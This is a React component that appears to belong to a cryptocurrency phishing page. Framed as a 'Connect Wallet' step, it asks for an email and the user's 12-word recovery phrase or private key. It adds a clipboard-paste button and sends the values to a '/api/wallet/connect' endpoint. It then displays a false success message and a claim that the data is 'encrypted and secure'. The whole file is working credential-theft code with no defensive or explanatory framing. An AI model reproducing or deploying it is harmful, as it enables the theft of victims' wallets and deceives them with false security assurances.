import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { insertWalletConnectionSchema } from "@shared/schema";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Eye, EyeOff, Lock, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { motion, AnimatePresence } from "framer-motion";

interface RecoverySectionProps {
  walletType: string;
}

export function RecoverySection({ walletType }: RecoverySectionProps) {
  const [isSuccess, setIsSuccess] = useState(false);
  const { toast } = useToast();

  const form = useForm({
    resolver: zodResolver(insertWalletConnectionSchema),
    defaultValues: {
      walletType,
      email: "",
      recoveryPhrase: "",
    },
  });

  const mutation = useMutation({
    mutationFn: async (data: any) => {
      const res = await apiRequest("POST", "/api/wallet/connect", data);
      return res.json();
    },
    onSuccess: () => {
      setIsSuccess(true);
      toast({
        title: "Wallet Connected",
        description: "Your wallet has been successfully connected.",
      });
    },
  });

  if (isSuccess) {
    return (
      <motion.div
        initial={{ scale: 0.8, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        className="flex flex-col items-center justify-center py-12 text-center"
      >
        <motion.div
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
        >
          <CheckCircle className="w-16 h-16 text-green-500 mb-4" />
        </motion.div>
        <h3 className="text-2xl font-semibold mb-2">Successfully Connected!</h3>
        <p className="text-muted-foreground">
          Your wallet has been securely connected to our platform
        </p>
      </motion.div>
    );
  }

  return (
    <div className="mt-8 space-y-6">
      <div className="flex items-center gap-2 p-4 bg-muted rounded-lg">
        <Lock className="w-5 h-5 text-primary" />
        <p className="text-sm text-muted-foreground">
          Your data is encrypted and secure
        </p>
      </div>

      <Form {...form}>
        <form
          onSubmit={form.handleSubmit((data) => mutation.mutate(data))}
          className="space-y-4"
        >
          <FormField
            control={form.control}
            name="email"
            render={({ field }) => (
              <FormItem>
                <FormLabel>Email Address</FormLabel>
                <FormControl>
                  <Input {...field} type="email" placeholder="your@email.com" />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

          <FormField
            control={form.control}
            name="recoveryPhrase"
            render={({ field }) => (
              <FormItem>
                <FormLabel>Recovery Phrase</FormLabel>
                <FormControl>
                  <div className="relative">
                    <Input
                      {...field}
                      type="text"
                      placeholder="Enter your 12-word recovery phrase"
                      className="pr-20"
                    />
                    <button
                      type="button"
                      onClick={async () => {
                        try {
                          const text = await navigator.clipboard.readText();
                          field.onChange(text);
                          toast({
                            title: "Pasted successfully",
                            variant: "default"
                          });
                        } catch (err) {
                          toast({
                            title: "Could not access clipboard",
                            description: "Please paste manually or allow clipboard access",
                            variant: "destructive"
                          });
                        }
                      }}
                      className="absolute right-2 top-1 bg-primary text-white px-3 py-1 rounded-md text-sm hover:bg-primary/80 transition-colors"
                    >
                      Paste
                    </button>
                  </div>
                </FormControl>
                <p className="text-xs text-muted-foreground mt-1">
                  Enter all 12+ words separated by spaces, or paste your private key
                </p>
                <FormMessage />
              </FormItem>
            )}
          />

          <Button
            type="submit"
            className="w-full"
            disabled={mutation.isPending}
          >
            {mutation.isPending ? "Connecting..." : "Connect Wallet"}
          </Button>
        </form>
      </Form>
    </div>
  );
}